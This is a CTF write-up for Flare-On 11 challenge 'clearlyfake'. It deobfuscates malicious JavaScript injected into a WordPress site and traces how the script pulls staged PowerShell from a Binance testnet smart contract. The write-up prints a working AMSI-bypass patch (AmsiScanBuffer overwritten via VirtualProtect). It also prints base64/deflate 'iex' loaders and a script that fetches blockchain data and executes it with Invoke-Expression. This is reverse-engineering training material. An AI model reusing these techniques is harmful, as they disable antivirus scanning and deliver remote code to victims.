Flare-On 11 <br>By DisplayGFX <br>Challenge 8: clearlyfake
===

 Challenge Description:
```
I am also considering a career change myself but this beautifully broken JavaScript was injected on my WordPress site I use to sell my hand-made artisanal macaroni necklaces, not sure what’s going on but there’s something about it being a Clear Fake? Not that I’m Smart enough to know how to use it or anything but is it a Contract?
```

This challenge was pretty easy, after the heartache of 7, and the long slog of 5.

In the zip file this time is only one file, `clearlyfake.js`.

The file is too long to show, but it seems to be an obfuscation technique. Theres a project that will deobfuscate pretty well called [`restringer`](https://github.com/PerimeterX/restringer) . Run that and output to a new file. you should get something like the below

```js
const Web3 = require('web3');
const fs = require('fs');
const web3 = new Web3('BINANCE_TESTNET_RPC_URL');
const contractAddress = '0x9223f0630c598a200f99c5d4746531d10319a569';
async function callContractFunction(inputString) {
  try {
    const methodId = '0x5684cff5';
    const encodedData = '0x5684cff5' + web3.eth.abi.encodeParameters(['string'], [inputString]).slice(2);
    const result = await web3.eth.call({
      to: '0x9223f0630c598a200f99c5d4746531d10319a569',
      data: encodedData
    });
    const largeString = web3.eth.abi.decodeParameter('string', result);
    const targetAddress = Buffer.from(largeString, 'base64').toString('utf-8');
    const filePath = 'decoded_output.txt';
    fs.writeFileSync('decoded_output.txt', '$address = ' + targetAddress + '\n');
    const new_methodId = '0x5c880fcb';
    const blockNumber = 43152014;
    const newEncodedData = '0x5c880fcb' + web3.eth.abi.encodeParameters(['address'], [targetAddress]).slice(2);
    const newData = await web3.eth.call({
      to: '0x9223f0630c598a200f99c5d4746531d10319a569',
      data: newEncodedData
    }, 43152014);
    const decodedData = web3.eth.abi.decodeParameter('string', newData);
    const base64DecodedData = Buffer.from(decodedData, 'base64').toString('utf-8');
    fs.writeFileSync('decoded_output.txt', decodedData);
    console.log('Saved decoded data to:decoded_output.txt');
  } catch (error) {
    console.error('Error calling contract function:', error);
  }
}
const inputString = 'KEY_CHECK_VALUE';
callContractFunction('KEY_CHECK_VALUE');
```

This is very much a web3 challenge, on `BINANCE_TESTNET_RPC`. It also grabs some data from the contract, and base64 decodes it and writes the data to `decoded_output.txt`.

We can look at this contract [here](https://testnet.bscscan.com/address/0x9223f0630c598a200f99c5d4746531d10319a569) . Not much to gain with the transactions, however, we can disassemble the contract itself, which I have done [here](https://app.dedaub.com/decompile?md5=706b498d50dcfda49235d0af08e5388d). The important part is looking at the address in the binary `0x5324eab94b236d4d1456edc574363b113cebf09d` that is returned if the input passes all of the checks.

[The address](https://testnet.bscscan.com/address/0x5324eab94b236d4d1456edc574363b113cebf09d) shows a lot of transactions, but the one we care about right now is defined in the javascript, block #[43152014](https://testnet.bscscan.com/tx/0x05660d13d9d92bc1fc54fb44c738b7c9892841efc9df4b295e2b7fda79756c47). We know that a certain segment is decoded from base64, so grab the input bytes, and keep deleting until you get sensible text from the base 64. There are a bunch of null bytes, so getting the data right after the big gap, and deleting one character at a time in cyberchef should eventually result in this output.

```powershell
[sYstEm.Text.eNCODinG]::unicodE.getStrinG([sYstEm.cONvErt]::FroMbaSE64stRInG("Iw[snip]AA=="))|iex
```

That's powershell, and its executing whatever is in this next layer of base64. Decoding that should result in....

```powershell
#Rasta-mouses Amsi-Scan-Buffer patch \n
$fhfyc = @"
using System;
using System.Runtime.InteropServices;
public class fhfyc {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ixajmz, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $fhfyc

$nzwtgvd = [fhfyc]::LoadLibrary("$(('ãmsí.'+'dll').NOrmAlizE([cHaR](70*31/31)+[char](111)+[Char]([Byte]0x72)+[CHaR](109+60-60)+[ChaR](54+14)) -replace [chaR]([bYTE]0x5c)+[CHar]([bYTE]0x70)+[ChAR](123+2-2)+[CHar]([byte]0x4d)+[ChAR]([bYTE]0x6e)+[char]([byTE]0x7d))")
$njywgo = [fhfyc]::GetProcAddress($nzwtgvd, "$(('ÁmsìSc'+'änBuff'+'er').NOrmALIzE([CHaR]([bYTE]0x46)+[Char]([bYTe]0x6f)+[cHAr]([bYTE]0x72)+[CHar](109)+[cHaR]([ByTe]0x44)) -replace [chAR](92)+[Char]([byTE]0x70)+[chaR]([bYTE]0x7b)+[chaR]([BYtE]0x4d)+[char](21+89)+[chaR](31+94))")
$p = 0
[fhfyc]::VirtualProtect($njywgo, [uint32]5, 0x40, [ref]$p)
$haly = "0xB8"
$ddng = "0x57"
$xdeq = "0x00"
$mbrf = "0x07"
$ewaq = "0x80"
$fqzt = "0xC3"
$yfnjb = [Byte[]] ($haly,$ddng,$xdeq,$mbrf,+$ewaq,+$fqzt)
[System.Runtime.InteropServices.Marshal]::Copy($yfnjb, 0, $njywgo, 6)
```

Still encoded, but I see `amsi.dll`, and there's a comment saying its an amsi patch. This should be enough as an exercise for the reader to decode, but I will move on.

If you look at block #[43149124](https://testnet.bscscan.com/tx/0x5a6675770eff26562a47efa4e22bbf29d764351c13d8b1dce1f9c4f6a471d2f3) with the same approach, youll get a different script

```powershell
invOKe-eXpREsSIon (NeW-OBJeCt SystEm.Io.StReaMREAdeR((NeW-OBJeCt Io.COMPRESsIOn.deflATestream( [sYSTeM.Io.memORyStREaM] [cONvErt]::fROmbAsE64StriNg('jV[snip]0v' ) , [iO.compRESSION.CompREsSionMode]::dEcoMPrEss ) ) , [SyStEm.TEXt.EnCodINg]::asCII)).ReaDTOEND()
```

This too executes base64 encoded powershell, but clearly this one is different. I used [`PowerDecode`](https://github.com/Malandrone/PowerDecode) to decompress and deobfuscate the powershell into something readable.

```powershell
Set-Variable -Name testnet_endpoint -Value (" ")
Set-Variable -Name _body -Value ('{"method":"eth_call","params":[{"to":"$address","data":"0x5c880fcb"}, BLOCK],"id":1,"jsonrpc":"2.0"}')
Set-Variable -Name resp -Value ((Invoke-RestMethod -Method 'Post' -Uri $testnet_endpoint -ContentType "application/json" -Body $_body).result)

# Remove the '0x' prefix
Set-Variable -Name hexNumber -Value ($resp -replace '0x', '')
# Convert from hex to bytes (ensuring pairs of hex characters)
Set-Variable -Name bytes0 -Value (0..($hexNumber.Length / 2 - 1) | ForEach-Object {
    Set-Variable -Name startIndex -Value ($_ * 2)
    Set-Variable -Name endIndex -Value ($startIndex + 1)
    [Convert]::ToByte($hexNumber.Substring($startIndex, 2), 16)
}) 
Set-Variable -Name bytes1 -Value ([System.Text.Encoding]::UTF8.GetString($bytes0))
Set-Variable -Name bytes2 -Value ($bytes1.Substring(64, 188))

# Convert from base64 to bytes
Set-Variable -Name bytesFromBase64 -Value ([Convert]::FromBase64String($bytes2))
Set-Variable -Name resultAscii -Value ([System.Text.Encoding]::UTF8.GetString($bytesFromBase64))
Set-Variable -Name hexBytes -Value ($resultAscii | ForEach-Object {
    '{0:X2}' -f $_  # Format each byte as two-digit hex with uppercase letters
})
Set-Variable -Name hexString -Value ($hexBytes -join ' ') 
#Write-Output $hexString
Set-Variable -Name hexBytes -Value ($hexBytes -replace " ", "")
# Convert from hex to bytes (ensuring pairs of hex characters)
Set-Variable -Name bytes3 -Value (0..($hexBytes.Length / 2 - 1) | ForEach-Object {
    Set-Variable -Name startIndex -Value ($_ * 2)
    Set-Variable -Name endIndex -Value ($startIndex + 1)
    [Convert]::ToByte($hexBytes.Substring($startIndex, 2), 16)
})
Set-Variable -Name bytes5 -Value ([Text.Encoding]::UTF8.GetString($bytes3))
# Convert the key to bytes
Set-Variable -Name keyBytes -Value ([Text.Encoding]::ASCII.GetBytes("FLAREON24"))
# Perform the XOR operation
Set-Variable -Name resultBytes -Value (@())
for (Set-Variable -Name i -Value (0); $i -lt $bytes5.Length; $i++) {
    Set-Variable -Name resultBytes -Value ($resultBytes + ($bytes5[$i] -bxor $keyBytes[$i % $keyBytes.Length])) 
}
# Convert the result back to a string (assuming ASCII encoding)
Set-Variable -Name resultString -Value ([System.Text.Encoding]::ASCII.GetString($resultBytes))

Set-Variable -Name command -Value ("tar -x --use-compress-program 'cmd /c echo $resultString > C:\\flag' -f C:\\flag")
Invoke-Expression $command
```

Helpfully, the comments are included with this powershell script, these are from the decoding, not mine. From here, we can see that, whatever is being decrypted, its using `FLAREON24` as the XOR key.  Also, we know that its searching for strings that match `AA BB cc 11 22`, so if thats the decoded bytes, then its the kind of string to look for. We also know that `$address` is already set from the outermost javascript writing the line defining it with the address before the above block. 

Lets go block by block, find if any of them match after a base64 decode. There are a few matches
```
block #43149133:01 23 2e 36 65 3b 26 5b 5a 21 6c 35 3a 2c 3c 6e 5b 47 66 23 2f 72 31 27 2b 12 40 23 3f 35 3c 20 3b
block #43149124:1f 29 35 72 28 20 3c 57 14 28 23 28 21 20 6e 6f
block #43149119:0f 6c 36 3b 36 27 6e 46 5c 2f 3f 61 25 24 3c 6e 46 5c 23 6c 27 3e 24 28
block #43148912:08 7c 35 0d 76 39 7d 5c 6b 02 1c 13 19 1a 26 7b 6d 60 2e 7d 74 0d 74 7c 7d 05 6b 77 22 1e 05 20 2d 7d 72 52 2a 2d 33 37 68 20 20 1c 57 29 21
block #43145703:41 3a 7a 7b 3c 7c 3d 4a 50 4e 5e 76 44 55 67 11 50 5e 66 15 3a 55 3f 17 3c 3d 51 15 61 55 59 41 6d 39 4e 42 63 6b 7c 41 22 65 60 0a 6c 65 63
```

And lets reconfigure these into a python script to decrypt with xor

```python
bytestrings = [
    (b'41 3a 7a 7b 3c 7c 3d 4a 50 4e 5e 76 44 55 67 11 50 5e 66 15 3a 55 3f 17 3c 3d 51 15 61 55 59 41 6d 39 4e 42 63 6b 7c 41 22 65 60 0a 6c 65 63',43145703),
    (b'08 7c 35 0d 76 39 7d 5c 6b 02 1c 13 19 1a 26 7b 6d 60 2e 7d 74 0d 74 7c 7d 05 6b 77 22 1e 05 20 2d 7d 72 52 2a 2d 33 37 68 20 20 1c 57 29 21',43148912),
    (b'0f 6c 36 3b 36 27 6e 46 5c 2f 3f 61 25 24 3c 6e 46 5c 23 6c 27 3e 24 28',43149119),
    (b'1f 29 35 72 28 20 3c 57 14 28 23 28 21 20 6e 6f',43149124),
    (b'01 23 2e 36 65 3b 26 5b 5a 21 6c 35 3a 2c 3c 6e 5b 47 66 23 2f 72 31 27 2b 12 40 23 3f 35 3c 20 3b',43149133)
]

for y,blocknum in bytestrings:

    # Prepare for XOR operation
    hex_bytes_cleaned = y.decode().replace(" ", "")
    bytes3 = bytes(int(hex_bytes_cleaned[i:i+2], 16) for i in range(0, len(hex_bytes_cleaned), 2))
    # Convert the key to bytes
    key_bytes = b"FLAREON24"

    # Perform the XOR operation
    result_bytes = bytearray()
    for i in range(len(bytes3)):
        result_bytes.append((bytes3[i]) ^ (key_bytes[i % len(key_bytes)]))
    print(f"Result for block#{blocknum}:")
    print(result_bytes.decode())
    #print(result_bytes.hex())
```

```
$ python dumb.py   
Result for block#43145703:
v;)y3sx7(_bj Y{zXreS-
                     "w|v%'=g*.8X#/
Result for block#43148912:
N0t_3v3n_DPRK_i5_Th15_1337_1n_Web3@flare-on.com
Result for block#43149119:
I wish this was the flag
Result for block#43149124:
Yet more noise!!
Result for block#43149133:
Good thing this is on the testnet
```

And that is the flag. oddly enough, block #43145703 does seem to fit the format, as what I have above is what you get when you decode from base64 and run through the process, but as for what the data is? I have no idea. maybe more XORing, who knows.